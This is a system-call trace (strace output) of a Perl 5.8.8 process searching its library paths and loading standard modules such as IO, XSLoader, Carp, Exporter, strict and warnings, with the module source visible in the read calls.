11891 07:39:45.152901 stat64("/usr/local/lib/perl/5.8.7", 0xbfeb6960) = -1 ENOENT (No such file or directory)
11891 07:39:45.152913 stat64("/usr/local/share/perl/5.8.7", 0xbfeb6960) = -1 ENOENT (No such file or directory)
11891 07:39:45.152925 stat64("/usr/local/lib/perl/5.8.6", 0xbfeb6960) = -1 ENOENT (No such file or directory)
11891 07:39:45.152936 stat64("/usr/local/share/perl/5.8.6", 0xbfeb6960) = -1 ENOENT (No such file or directory)
11891 07:39:45.152947 stat64("/usr/local/lib/perl/5.8.4", 0xbfeb6960) = -1 ENOENT (No such file or directory)
11891 07:39:45.152959 stat64("/usr/local/share/perl/5.8.4", 0xbfeb6960) = -1 ENOENT (No such file or directory)
11891 07:39:45.152970 stat64("/usr/local/lib/perl/5.8.3", 0xbfeb6960) = -1 ENOENT (No such file or directory)
11891 07:39:45.152981 stat64("/usr/local/share/perl/5.8.3", 0xbfeb6960) = -1 ENOENT (No such file or directory)
11891 07:39:45.152992 stat64("/usr/local/lib/perl/5.8.2", 0xbfeb6960) = -1 ENOENT (No such file or directory)
11891 07:39:45.153003 stat64("/usr/local/share/perl/5.8.2", 0xbfeb6960) = -1 ENOENT (No such file or directory)
11891 07:39:45.153015 stat64("/usr/local/lib/perl/5.8.1", 0xbfeb6960) = -1 ENOENT (No such file or directory)
11891 07:39:45.153026 stat64("/usr/local/share/perl/5.8.1", 0xbfeb6960) = -1 ENOENT (No such file or directory)
11891 07:39:45.153037 stat64("/usr/local/lib/perl/5.8.0", 0xbfeb6960) = -1 ENOENT (No such file or directory)
11891 07:39:45.153048 stat64("/usr/local/share/perl/5.8.0", 0xbfeb6960) = -1 ENOENT (No such file or directory)
11891 07:39:45.153097 ioctl(0, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfeb6658) = -1 ENOTTY (Inappropriate ioctl for device)
11891 07:39:45.153113 _llseek(0, 0, [0], SEEK_CUR) = 0
11891 07:39:45.153126 ioctl(1, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfeb6658) = -1 EBADF (Bad file descriptor)
11891 07:39:45.153151 _llseek(1, 0, 0xbfeb66a0, SEEK_CUR) = -1 EBADF (Bad file descriptor)
11891 07:39:45.153161 ioctl(2, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfeb6658) = -1 EINVAL (Invalid argument)
11891 07:39:45.153172 _llseek(2, 0, 0xbfeb66a0, SEEK_CUR) = -1 ESPIPE (Illegal seek)
11891 07:39:45.153182 open("/dev/null", O_RDONLY|O_LARGEFILE) = 1
11891 07:39:45.153194 ioctl(1, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfeb6718) = -1 ENOTTY (Inappropriate ioctl for device)
11891 07:39:45.153204 _llseek(1, 0, [0], SEEK_CUR) = 0
11891 07:39:45.153215 fcntl64(1, F_SETFD, FD_CLOEXEC) = 0
11891 07:39:45.153230 fstat64(1, {st_mode=S_IFCHR|0666, st_rdev=makedev(1, 3), ...}) = 0
11891 07:39:45.153248 rt_sigaction(SIGCHLD, NULL, {SIG_DFL}, 8) = 0
11891 07:39:45.153299 readlink("/proc/self/exe", "/usr/bin/perl", 4095) = 13
11891 07:39:45.153342 getppid()         = 11889
11891 07:39:45.153408 stat64("/etc/perl/IO.pmc", 0xbfeb640c) = -1 ENOENT (No such file or directory)
11891 07:39:45.153423 stat64("/etc/perl/IO.pm", 0xbfeb631c) = -1 ENOENT (No such file or directory)
11891 07:39:45.153436 stat64("/usr/local/lib/perl/5.8.8/IO.pmc", 0xbfeb640c) = -1 ENOENT (No such file or directory)
11891 07:39:45.153476 stat64("/usr/local/lib/perl/5.8.8/IO.pm", 0xbfeb631c) = -1 ENOENT (No such file or directory)
11891 07:39:45.153490 stat64("/usr/local/share/perl/5.8.8/IO.pmc", 0xbfeb640c) = -1 ENOENT (No such file or directory)
11891 07:39:45.153502 stat64("/usr/local/share/perl/5.8.8/IO.pm", 0xbfeb631c) = -1 ENOENT (No such file or directory)
11891 07:39:45.153516 stat64("/usr/lib/perl5/IO.pmc", 0xbfeb640c) = -1 ENOENT (No such file or directory)
11891 07:39:45.153592 stat64("/usr/lib/perl5/IO.pm", 0xbfeb631c) = -1 ENOENT (No such file or directory)
11891 07:39:45.153644 stat64("/usr/share/perl5/IO.pmc", 0xbfeb640c) = -1 ENOENT (No such file or directory)
11891 07:39:45.153656 stat64("/usr/share/perl5/IO.pm", 0xbfeb631c) = -1 ENOENT (No such file or directory)
11891 07:39:45.153669 stat64("/usr/lib/perl/5.8/IO.pmc", 0xbfeb640c) = -1 ENOENT (No such file or directory)
11891 07:39:45.153682 stat64("/usr/lib/perl/5.8/IO.pm", {st_mode=S_IFREG|0644, st_size=413, ...}) = 0
11891 07:39:45.153704 open("/usr/lib/perl/5.8/IO.pm", O_RDONLY|O_LARGEFILE) = 6
11891 07:39:45.153739 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfeb6128) = -1 ENOTTY (Inappropriate ioctl for device)
11891 07:39:45.153750 _llseek(6, 0, [0], SEEK_CUR) = 0
11891 07:39:45.153773 read(6, "#\n\npackage IO;\n\nuse XSLoader ();\nuse Carp;\nuse strict;\nuse warnings;\n\nour $VERSION = \"1.22\";\nXSLoader::load \'IO\', $VERSION;\n\nsub import {\n    shift;\n\n    warnings::warnif(\'deprecated\', qq{Parameterless \"use IO\" deprecated})\n        if @_ == 0 ;\n    \n    my @l = @_ ? @_ : qw(Handle Seekable File Pipe Socket Dir);\n\n    eval join(\"\", map { \"require IO::\" . (/(\\w+)/)[0] . \";\\n\" } @l)\n\tor croak $@;\n}\n\n1;\n\n__END__\n\n", 4096) = 413
11891 07:39:45.153872 stat64("/etc/perl/XSLoader.pmc", 0xbfeb5f5c) = -1 ENOENT (No such file or directory)
11891 07:39:45.153906 stat64("/etc/perl/XSLoader.pm", 0xbfeb5e6c) = -1 ENOENT (No such file or directory)
11891 07:39:45.153936 stat64("/usr/local/lib/perl/5.8.8/XSLoader.pmc", 0xbfeb5f5c) = -1 ENOENT (No such file or directory)
11891 07:39:45.153970 stat64("/usr/local/lib/perl/5.8.8/XSLoader.pm", 0xbfeb5e6c) = -1 ENOENT (No such file or directory)
11891 07:39:45.153984 stat64("/usr/local/share/perl/5.8.8/XSLoader.pmc", 0xbfeb5f5c) = -1 ENOENT (No such file or directory)
11891 07:39:45.154029 stat64("/usr/local/share/perl/5.8.8/XSLoader.pm", 0xbfeb5e6c) = -1 ENOENT (No such file or directory)
11891 07:39:45.154052 stat64("/usr/lib/perl5/XSLoader.pmc", 0xbfeb5f5c) = -1 ENOENT (No such file or directory)
11891 07:39:45.154064 stat64("/usr/lib/perl5/XSLoader.pm", 0xbfeb5e6c) = -1 ENOENT (No such file or directory)
11891 07:39:45.154114 stat64("/usr/share/perl5/XSLoader.pmc", 0xbfeb5f5c) = -1 ENOENT (No such file or directory)
11891 07:39:45.154143 stat64("/usr/share/perl5/XSLoader.pm", 0xbfeb5e6c) = -1 ENOENT (No such file or directory)
11891 07:39:45.154156 stat64("/usr/lib/perl/5.8/XSLoader.pmc", 0xbfeb5f5c) = -1 ENOENT (No such file or directory)
11891 07:39:45.154169 stat64("/usr/lib/perl/5.8/XSLoader.pm", {st_mode=S_IFREG|0644, st_size=3408, ...}) = 0
11891 07:39:45.154190 open("/usr/lib/perl/5.8/XSLoader.pm", O_RDONLY|O_LARGEFILE) = 8
11891 07:39:45.154206 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfeb5c78) = -1 ENOTTY (Inappropriate ioctl for device)
11891 07:39:45.154232 _llseek(8, 0, [0], SEEK_CUR) = 0
11891 07:39:45.154251 read(8, "# Generated from XSLoader.pm.PL (resolved %Config::Config value)\n\npackage XSLoader;\n\n$VERSION = \"0.06\";\n\n#use strict;\n\n# enable debug/trace messages from DynaLoader perl code\n# $dl_debug = $ENV{PERL_DL_DEBUG} || 0 unless defined $dl_debug;\n\n  my $dl_dlext = \'so\';\n\npackage DynaLoader;\n\n# No prizes for guessing why we don\'t say \'bootstrap DynaLoader;\' here.\n# NOTE: All dl_*.xs (including dl_none.xs) define a dl_error() XSUB\nboot_DynaLoader(\'DynaLoader\') if defined(&boot_DynaLoader) &&\n                                !defined(&dl_error);\npackage XSLoader;\n\nsub load {\n    package DynaLoader;\n\n    die q{XSLoader::load(\'Your::Module\', $Your::Module::VERSION)} unless @_;\n\n    my($module) = $_[0];\n\n    # work with static linking too\n    my $b = \"$module\\::bootstrap\";\n    goto &$b if defined &$b;\n\n    goto retry unless $module and defined &dl_load_file;\n\n    my @modparts = split(/::/,$module);\n    my $modfname = $modparts[-1];\n\n    my $modpname = join(\'/\',@modparts);\n    my $modlibname = (caller())[1];\n    my $c = @modparts;\n    $modlibname =~ s,[\\\\/][^\\\\/]+$,, while $c--;\t# Q&D basename\n    my $file = \"$modlibname/auto/$modpname/$modfname.$dl_dlext\";\n\n#   print STDERR \"XSLoader::load for $module ($file)\\n\" if $dl_debug;\n\n    my $bs = $file;\n    $bs =~ s/(\\.\\w+)?(;\\d*)?$/\\.bs/; # look for .bs \'beside\' the library\n\n    goto retry if not -f $file or -s $bs;\n\n    my $bootname = \"boot_$module\";\n    $bootname =~ s/\\W/_/g;\n    @DynaLoader::dl_require_symbols = ($bootname);\n\n    my $boot_symbol_ref;\n\n    if ($^O eq \'darwin\') {\n        if ($boot_symbol_ref = dl_find_symbol(0, $bootname)) {\n            goto boot; #extension library has already been loaded, e.g. darwin\n        }\n    }\n\n    # Many dynamic extension loading problems will appear to come from\n    # this section of code: XYZ failed at line 123 of DynaLoader.pm.\n    # Often these errors are actually occurring in the initialisation\n    # C code of the extension XS file. Perl reports the error as being\n    # in this perl code simply because this was the last perl code\n    # it executed.\n\n    my $libref = dl_load_file($file, 0) or do { \n        require Carp;\n        Carp::croak(\"Can\'t load \'$file\' for module $module: \" . dl_error());\n    };\n    push(@DynaLoader::dl_librefs,$libref);  # record loaded object\n\n    my @unresolved = dl_undef_symbols();\n    if (@unresolved) {\n        require Carp;\n        Carp::carp(\"Undefined symbols present after loading $file: @unresolved\\n\");\n    }\n\n    $boot_symbol_ref = dl_find_symbol($libref, $bootname) or do {\n        require Carp;\n        Carp::croak(\"Can\'t find \'$bootname\' symbol in $file\\n\");\n    };\n\n    push(@DynaLoader::dl_modules, $module); # record loaded module\n\n  boot:\n    my $xs = dl_install_xsub(\"${module}::bootstrap\", $boot_symbol_ref, $file);\n\n    # See comment block above\n    return &$xs(@_);\n\n  retry:\n    my $bootstrap_inherit = DynaLoader->can(\'bootstrap_inherit\') || \n                            XSLoader->can(\'bootstrap_inherit\');\n    goto &$bootstrap_inherit;\n}\n\n# Versions of DynaLoader prior to 5.6.0 don\'t have this function.\nsub bootstrap_inherit {\n    package DynaLoader;\n\n    my $module = $_[0];\n    local *DynaLoader::isa = *{\"$module\\::ISA\"};\n    local @DynaLoader::isa = (@DynaLoader::isa, \'DynaLoader\');\n    # Cannot goto due to delocalization.  Will report errors on a wrong line?\n    require DynaLoader;\n    DynaLoader::bootstrap(@_);\n}\n\n1;\n\n__END__\n\n", 4096) = 3408
11891 07:39:45.154484 brk(0x8195000)    = 0x8195000
11891 07:39:45.154835 _llseek(8, 3407, [3407], SEEK_SET) = 0
11891 07:39:45.154852 _llseek(8, 0, [3407], SEEK_CUR) = 0
11891 07:39:45.154862 close(8)          = 0
11891 07:39:45.154907 stat64("/etc/perl/Carp.pmc", 0xbfeb5f5c) = -1 ENOENT (No such file or directory)
11891 07:39:45.154922 stat64("/etc/perl/Carp.pm", 0xbfeb5e6c) = -1 ENOENT (No such file or directory)
11891 07:39:45.154935 stat64("/usr/local/lib/perl/5.8.8/Carp.pmc", 0xbfeb5f5c) = -1 ENOENT (No such file or directory)
11891 07:39:45.154951 stat64("/usr/local/lib/perl/5.8.8/Carp.pm", 0xbfeb5e6c) = -1 ENOENT (No such file or directory)
11891 07:39:45.154965 stat64("/usr/local/share/perl/5.8.8/Carp.pmc", 0xbfeb5f5c) = -1 ENOENT (No such file or directory)
11891 07:39:45.154977 stat64("/usr/local/share/perl/5.8.8/Carp.pm", 0xbfeb5e6c) = -1 ENOENT (No such file or directory)
11891 07:39:45.154990 stat64("/usr/lib/perl5/Carp.pmc", 0xbfeb5f5c) = -1 ENOENT (No such file or directory)
11891 07:39:45.155002 stat64("/usr/lib/perl5/Carp.pm", 0xbfeb5e6c) = -1 ENOENT (No such file or directory)
11891 07:39:45.155014 stat64("/usr/share/perl5/Carp.pmc", 0xbfeb5f5c) = -1 ENOENT (No such file or directory)
11891 07:39:45.155026 stat64("/usr/share/perl5/Carp.pm", 0xbfeb5e6c) = -1 ENOENT (No such file or directory)
11891 07:39:45.155039 stat64("/usr/lib/perl/5.8/Carp.pmc", 0xbfeb5f5c) = -1 ENOENT (No such file or directory)
11891 07:39:45.155051 stat64("/usr/lib/perl/5.8/Carp.pm", 0xbfeb5e6c) = -1 ENOENT (No such file or directory)
11891 07:39:45.155092 stat64("/usr/share/perl/5.8/Carp.pmc", 0xbfeb5f5c) = -1 ENOENT (No such file or directory)
11891 07:39:45.155107 stat64("/usr/share/perl/5.8/Carp.pm", {st_mode=S_IFREG|0644, st_size=4112, ...}) = 0
11891 07:39:45.155144 open("/usr/share/perl/5.8/Carp.pm", O_RDONLY|O_LARGEFILE) = 8
11891 07:39:45.155158 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfeb5c78) = -1 ENOTTY (Inappropriate ioctl for device)
11891 07:39:45.155170 _llseek(8, 0, [0], SEEK_CUR) = 0
11891 07:39:45.155186 read(8, "package Carp;\n\nour $VERSION = \'1.04\';\n\n# This package is heavily used. Be small. Be fast. Be good.\n\n# Comments added by Andy Wardley <abw@kfs.org> 09-Apr-98, based on an\n# _almost_ complete understanding of the package.  Corrections and\n# comments are welcome.\n\n# The members of %Internal are packages that are internal to perl.\n# Carp will not report errors from within these packages if it\n# can.  The members of %CarpInternal are internal to Perl\'s warning\n# system.  Carp will not report errors from within these packages\n# either, and will not report calls *to* these packages for carp and\n# croak.  They replace $CarpLevel, which is deprecated.    The\n# $Max(EvalLen|(Arg(Len|Nums)) variables are used to specify how the eval\n# text and function arguments should be formatted when printed.\n\n# Comments added by Jos I. Boumans <kane@dwim.org> 11-Aug-2004\n# I can not get %CarpInternal or %Internal to work as advertised,\n# therefor leaving it out of the below documentation.\n# $CarpLevel may be decprecated according to the last comment, but\n# after 6 years, it\'s still around and in heavy use ;)\n\n$CarpInternal{Carp}++;\n$CarpInternal{warnings}++;\n$CarpLevel = 0;     # How many extra package levels to skip on carp.\n                    # How many calls to skip on confess.\n                    # Reconciling these notions is hard, use\n                    # %Internal and %CarpInternal instead.\n$MaxEvalLen = 0;    # How much eval \'...text...\' to show. 0 = all.\n$MaxArgLen = 64;    # How much of each argument to print. 0 = all.\n$MaxArgNums = 8;    # How many arguments to print. 0 = all.\n$Verbose = 0;       # If true then make shortmess call longmess instead\n\nrequire Exporter;\n@ISA = (\'Exporter\');\n@EXPORT = qw(confess croak carp);\n@EXPORT_OK = qw(cluck verbose longmess shortmess);\n@EXPORT_FAIL = qw(verbose);\t# hook to enable verbose mode\n\n# if the caller specifies verbose usage (\"perl -MCarp=verbose script.pl\")\n# then the following method will be called by the Exporter which knows\n# to do this thanks to @EXPORT_FAIL, above.  $_[1] will contain the word\n# \'verbose\'.\n\nsub export_fail {\n    shift;\n    $Verbose = shift if $_[0] eq \'verbose\';\n    return @_;\n}\n\n# longmess() crawls all the way up the stack reporting on all the function\n# calls made.  The error string, $error, is originally constructed from the\n# arguments passed into longmess() via confess(), cluck() or shortmess().\n# This gets appended with the stack trace messages which are generated for\n# each function call on the stack.\n\nsub longmess {\n    {\n\tlocal($@, $!);\n\t# XXX fix require to not clear $@ or $!?\n\t# don\'t use require unless we need to (for Safe compartments)\n\trequire Carp::Heavy unless $INC{\"Carp/Heavy.pm\"};\n    }\n    # Icky backwards compatibility wrapper. :-(\n    my $call_pack = caller();\n    if ($Internal{$call_pack} or $CarpInternal{$call_pack}) {\n      return longmess_heavy(@_);\n    }\n    else {\n      local $CarpLevel = $CarpLevel + 1;\n      return longmess_heavy(@_);\n    }\n}\n\n# shortmess() is called by carp() and croak() to skip all the way up to\n# the top-level caller\'s package and report the error from there.  confess()\n# and cluck() generate a full stack trace so they call longmess() to\n# generate that.  In verbose mode shortmess() calls longmess() so\n# you always get a stack trace\n\nsub shortmess {\t# Short-circuit &longmess if called via multiple packages\n    {\n\tlocal($@, $!);\n\t# XXX fix require to not clear $@ or $!?\n\t# don\'t use require unless we need to (for Safe compartments)\n\trequire Carp::Heavy unless $INC{\"Carp/Heavy.pm\"};\n    }\n    # Icky backwards compatibility wrapper. :-(\n    my $call_pack = caller();\n    local @CARP_NOT = caller();\n    shortmess_heavy(@_);\n}\n\n# the following four functions call longmess() or shortmess() depending on\n# whether they should generate a full stack trace (confess() and cluck())\n# or simply report the caller\'s package (croak() and carp()), respectively.\n# confess() and croak() die, carp() and cluck() warn.\n\nsub croak   { die  shortmess @_ }\nsub confess { die  longmess  @_ }\nsub carp    { warn shortmess @_ }\nsub cluck   { warn lon", 4096) = 4096
11891 07:39:45.155652 read(8, "gmess  @_ }\n\n1;\n", 4096) = 16
11891 07:39:45.155679 read(8, "", 4096) = 0
11891 07:39:45.155691 close(8)          = 0
11891 07:39:45.155712 stat64("/etc/perl/Exporter.pmc", 0xbfeb5f5c) = -1 ENOENT (No such file or directory)
11891 07:39:45.155725 stat64("/etc/perl/Exporter.pm", 0xbfeb5e6c) = -1 ENOENT (No such file or directory)
11891 07:39:45.155739 stat64("/usr/local/lib/perl/5.8.8/Exporter.pmc", 0xbfeb5f5c) = -1 ENOENT (No such file or directory)
11891 07:39:45.155751 stat64("/usr/local/lib/perl/5.8.8/Exporter.pm", 0xbfeb5e6c) = -1 ENOENT (No such file or directory)
11891 07:39:45.155765 stat64("/usr/local/share/perl/5.8.8/Exporter.pmc", 0xbfeb5f5c) = -1 ENOENT (No such file or directory)
11891 07:39:45.155777 stat64("/usr/local/share/perl/5.8.8/Exporter.pm", 0xbfeb5e6c) = -1 ENOENT (No such file or directory)
11891 07:39:45.155791 stat64("/usr/lib/perl5/Exporter.pmc", 0xbfeb5f5c) = -1 ENOENT (No such file or directory)
11891 07:39:45.155803 stat64("/usr/lib/perl5/Exporter.pm", 0xbfeb5e6c) = -1 ENOENT (No such file or directory)
11891 07:39:45.155815 stat64("/usr/share/perl5/Exporter.pmc", 0xbfeb5f5c) = -1 ENOENT (No such file or directory)
11891 07:39:45.155827 stat64("/usr/share/perl5/Exporter.pm", 0xbfeb5e6c) = -1 ENOENT (No such file or directory)
11891 07:39:45.155840 stat64("/usr/lib/perl/5.8/Exporter.pmc", 0xbfeb5f5c) = -1 ENOENT (No such file or directory)
11891 07:39:45.155852 stat64("/usr/lib/perl/5.8/Exporter.pm", 0xbfeb5e6c) = -1 ENOENT (No such file or directory)
11891 07:39:45.155865 stat64("/usr/share/perl/5.8/Exporter.pmc", 0xbfeb5f5c) = -1 ENOENT (No such file or directory)
11891 07:39:45.155878 stat64("/usr/share/perl/5.8/Exporter.pm", {st_mode=S_IFREG|0644, st_size=2218, ...}) = 0
11891 07:39:45.155898 open("/usr/share/perl/5.8/Exporter.pm", O_RDONLY|O_LARGEFILE) = 8
11891 07:39:45.155912 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfeb5c78) = -1 ENOTTY (Inappropriate ioctl for device)
11891 07:39:45.155924 _llseek(8, 0, [0], SEEK_CUR) = 0
11891 07:39:45.155939 read(8, "package Exporter;\n\nrequire 5.006;\n\n# Be lean.\n#use strict;\n#no strict \'refs\';\n\nour $Debug = 0;\nour $ExportLevel = 0;\nour $Verbose ||= 0;\nour $VERSION = \'5.58\';\nour (%Cache);\n$Carp::Internal{Exporter} = 1;\n\nsub as_heavy {\n  require Exporter::Heavy;\n  # Unfortunately, this does not work if the caller is aliased as *name = \\&foo\n  # Thus the need to create a lot of identical subroutines\n  my $c = (caller(1))[3];\n  $c =~ s/.*:://;\n  \\&{\"Exporter::Heavy::heavy_$c\"};\n}\n\nsub export {\n  goto &{as_heavy()};\n}\n\nsub import {\n  my $pkg = shift;\n  my $callpkg = caller($ExportLevel);\n\n  if ($pkg eq \"Exporter\" and @_ and $_[0] eq \"import\") {\n    *{$callpkg.\"::import\"} = \\&import;\n    return;\n  }\n\n  # We *need* to treat @{\"$pkg\\::EXPORT_FAIL\"} since Carp uses it :-(\n  my($exports, $fail) = (\\@{\"$pkg\\::EXPORT\"}, \\@{\"$pkg\\::EXPORT_FAIL\"});\n  return export $pkg, $callpkg, @_\n    if $Verbose or $Debug or @$fail > 1;\n  my $export_cache = ($Cache{$pkg} ||= {});\n  my $args = @_ or @_ = @$exports;\n\n  local $_;\n  if ($args and not %$export_cache) {\n    s/^&//, $export_cache->{$_} = 1\n      foreach (@$exports, @{\"$pkg\\::EXPORT_OK\"});\n  }\n  my $heavy;\n  # Try very hard not to use {} and hence have to  enter scope on the foreach\n  # We bomb out of the loop with last as soon as heavy is set.\n  if ($args or $fail) {\n    ($heavy = (/\\W/ or $args and not exists $export_cache->{$_}\n               or @$fail and $_ eq $fail->[0])) and last\n                 foreach (@_);\n  } else {\n    ($heavy = /\\W/) and last\n      foreach (@_);\n  }\n  return export $pkg, $callpkg, ($args ? @_ : ()) if $heavy;\n  local $SIG{__WARN__} = \n\tsub {require Carp; &Carp::carp};\n  # shortcut for the common case of no type character\n  *{\"$callpkg\\::$_\"} = \\&{\"$pkg\\::$_\"} foreach @_;\n}\n\n# Default methods\n\nsub export_fail {\n    my $self = shift;\n    @_;\n}\n\n# Unfortunately, caller(1)[3] \"does not work\" if the caller is aliased as\n# *name = \\&foo.  Thus the need to create a lot of identical subroutines\n# Otherwise we could have aliased them to export().\n\nsub export_to_level {\n  goto &{as_heavy()};\n}\n\nsub export_tags {\n  goto &{as_heavy()};\n}\n\nsub export_ok_tags {\n  goto &{as_heavy()};\n}\n\nsub require_version {\n  goto &{as_heavy()};\n}\n\n1;\n__END__\n\n", 4096) = 2218
11891 07:39:45.156480 _llseek(8, 2217, [2217], SEEK_SET) = 0
11891 07:39:45.156497 _llseek(8, 0, [2217], SEEK_CUR) = 0
11891 07:39:45.156507 close(8)          = 0
11891 07:39:45.156613 stat64("/etc/perl/strict.pmc", 0xbfeb5f5c) = -1 ENOENT (No such file or directory)
11891 07:39:45.156644 stat64("/etc/perl/strict.pm", 0xbfeb5e6c) = -1 ENOENT (No such file or directory)
11891 07:39:45.156657 stat64("/usr/local/lib/perl/5.8.8/strict.pmc", 0xbfeb5f5c) = -1 ENOENT (No such file or directory)
11891 07:39:45.156670 stat64("/usr/local/lib/perl/5.8.8/strict.pm", 0xbfeb5e6c) = -1 ENOENT (No such file or directory)
11891 07:39:45.156683 stat64("/usr/local/share/perl/5.8.8/strict.pmc", 0xbfeb5f5c) = -1 ENOENT (No such file or directory)
11891 07:39:45.156696 stat64("/usr/local/share/perl/5.8.8/strict.pm", 0xbfeb5e6c) = -1 ENOENT (No such file or directory)
11891 07:39:45.156709 stat64("/usr/lib/perl5/strict.pmc", 0xbfeb5f5c) = -1 ENOENT (No such file or directory)
11891 07:39:45.156721 stat64("/usr/lib/perl5/strict.pm", 0xbfeb5e6c) = -1 ENOENT (No such file or directory)
11891 07:39:45.156734 stat64("/usr/share/perl5/strict.pmc", 0xbfeb5f5c) = -1 ENOENT (No such file or directory)
11891 07:39:45.156745 stat64("/usr/share/perl5/strict.pm", 0xbfeb5e6c) = -1 ENOENT (No such file or directory)
11891 07:39:45.156758 stat64("/usr/lib/perl/5.8/strict.pmc", 0xbfeb5f5c) = -1 ENOENT (No such file or directory)
11891 07:39:45.156770 stat64("/usr/lib/perl/5.8/strict.pm", 0xbfeb5e6c) = -1 ENOENT (No such file or directory)
11891 07:39:45.156783 stat64("/usr/share/perl/5.8/strict.pmc", 0xbfeb5f5c) = -1 ENOENT (No such file or directory)
11891 07:39:45.156795 stat64("/usr/share/perl/5.8/strict.pm", {st_mode=S_IFREG|0644, st_size=599, ...}) = 0
11891 07:39:45.156816 open("/usr/share/perl/5.8/strict.pm", O_RDONLY|O_LARGEFILE) = 8
11891 07:39:45.156830 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfeb5c78) = -1 ENOTTY (Inappropriate ioctl for device)
11891 07:39:45.156841 _llseek(8, 0, [0], SEEK_CUR) = 0
11891 07:39:45.156860 read(8, "package strict;\n\n$strict::VERSION = \"1.03\";\n\nmy %bitmask = (\nrefs => 0x00000002,\nsubs => 0x00000200,\nvars => 0x00000400\n);\n\nsub bits {\n    my $bits = 0;\n    my @wrong;\n    foreach my $s (@_) {\n\tpush @wrong, $s unless exists $bitmask{$s};\n        $bits |= $bitmask{$s} || 0;\n    }\n    if (@wrong) {\n        require Carp;\n        Carp::croak(\"Unknown \'strict\' tag(s) \'@wrong\'\");\n    }\n    $bits;\n}\n\nmy $default_bits = bits(qw(refs subs vars));\n\nsub import {\n    shift;\n    $^H |= @_ ? bits(@_) : $default_bits;\n}\n\nsub unimport {\n    shift;\n    $^H &= ~ (@_ ? bits(@_) : $default_bits);\n}\n\n1;\n__END__\n\n", 4096) = 599
11891 07:39:45.157000 _llseek(8, 598, [598], SEEK_SET) = 0
11891 07:39:45.157014 _llseek(8, 0, [598], SEEK_CUR) = 0
11891 07:39:45.157024 close(8)          = 0
11891 07:39:45.157092 stat64("/etc/perl/warnings.pmc", 0xbfeb5f5c) = -1 ENOENT (No such file or directory)
11891 07:39:45.157109 stat64("/etc/perl/warnings.pm", 0xbfeb5e6c) = -1 ENOENT (No such file or directory)
11891 07:39:45.157123 stat64("/usr/local/lib/perl/5.8.8/warnings.pmc", 0xbfeb5f5c) = -1 ENOENT (No such file or directory)
11891 07:39:45.157152 stat64("/usr/local/lib/perl/5.8.8/warnings.pm", 0xbfeb5e6c) = -1 ENOENT (No such file or directory)
11891 07:39:45.157184 stat64("/usr/local/share/perl/5.8.8/warnings.pmc", 0xbfeb5f5c) = -1 ENOENT (No such file or directory)
11891 07:39:45.157196 stat64("/usr/local/share/perl/5.8.8/warnings.pm", 0xbfeb5e6c) = -1 ENOENT (No such file or directory)
11891 07:39:45.157232 stat64("/usr/lib/perl5/warnings.pmc", 0xbfeb5f5c) = -1 ENOENT (No such file or directory)
11891 07:39:45.157279 stat64("/usr/lib/perl5/warnings.pm", 0xbfeb5e6c) = -1 ENOENT (No such file or directory)
11891 07:39:45.157306 stat64("/usr/share/perl5/warnings.pmc", 0xbfeb5f5c) = -1 ENOENT (No such file or directory)
11891 07:39:45.157353 stat64("/usr/share/perl5/warnings.pm", 0xbfeb5e6c) = -1 ENOENT (No such file or directory)
11891 07:39:45.157385 stat64("/usr/lib/perl/5.8/warnings.pmc", 0xbfeb5f5c) = -1 ENOENT (No such file or directory)
11891 07:39:45.157431 stat64("/usr/lib/perl/5.8/warnings.pm", 0xbfeb5e6c) = -1 ENOENT (No such file or directory)
11891 07:39:45.157462 stat64("/usr/share/perl/5.8/warnings.pmc", 0xbfeb5f5c) = -1 ENOENT (No such file or directory)
11891 07:39:45.157507 stat64("/usr/share/perl/5.8/warnings.pm", {st_mode=S_IFREG|0644, st_size=13018, ...}) = 0
11891 07:39:45.157547 open("/usr/share/perl/5.8/warnings.pm", O_RDONLY|O_LARGEFILE) = 8
11891 07:39:45.157568 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfeb5c78) = -1 ENOTTY (Inappropriate ioctl for device)
11891 07:39:45.157600 _llseek(8, 0, [0], SEEK_CUR) = 0
11891 07:39:45.157650 read(8, "# -*- buffer-read-only: t -*-\n# !!!!!!!   DO NOT EDIT THIS FILE   !!!!!!!\n# This file was created by warnings.pl\n# Any changes made here will be lost.\n#\n\npackage warnings;\n\nour $VERSION = \'1.05\';\n\nuse Carp ();\n\nour %Offsets = (\n\n    # Warnings Categories added in Perl 5.008\n\n    \'all\'\t\t=> 0,\n    \'closure\'\t\t=> 2,\n    \'deprecated\'\t=> 4,\n    \'exiting\'\t\t=> 6,\n    \'glob\'\t\t=> 8,\n    \'io\'\t\t=> 10,\n    \'closed\'\t\t=> 12,\n    \'exec\'\t\t=> 14,\n    \'layer\'\t\t=> 16,\n    \'newline\'\t\t=> 18,\n    \'pipe\'\t\t=> 20,\n    \'unopened\'\t\t=> 22,\n    \'misc\'\t\t=> 24,\n    \'numeric\'\t\t=> 26,\n    \'once\'\t\t=> 28,\n    \'overflow\'\t\t=> 30,\n    \'pack\'\t\t=> 32,\n    \'portable\'\t\t=> 34,\n    \'recursion\'\t\t=> 36,\n    \'redefine\'\t\t=> 38,\n    \'regexp\'\t\t=> 40,\n    \'severe\'\t\t=> 42,\n    \'debugging\'\t\t=> 44,\n    \'inplace\'\t\t=> 46,\n    \'internal\'\t\t=> 48,\n    \'malloc\'\t\t=> 50,\n    \'signal\'\t\t=> 52,\n    \'substr\'\t\t=> 54,\n    \'syntax\'\t\t=> 56,\n    \'ambiguous\'\t\t=> 58,\n    \'bareword\'\t\t=> 60,\n    \'digit\'\t\t=> 62,\n    \'parenthesis\'\t=> 64,\n    \'precedence\'\t=> 66,\n    \'printf\'\t\t=> 68,\n    \'prototype\'\t\t=> 70,\n    \'qw\'\t\t=> 72,\n    \'reserved\'\t\t=> 74,\n    \'semicolon\'\t\t=> 76,\n    \'taint\'\t\t=> 78,\n    \'threads\'\t\t=> 80,\n    \'uninitialized\'\t=> 82,\n    \'unpack\'\t\t=> 84,\n    \'untie\'\t\t=> 86,\n    \'utf8\'\t\t=> 88,\n    \'void\'\t\t=> 90,\n    \'y2k\'\t\t=> 92,\n  );\n\nour 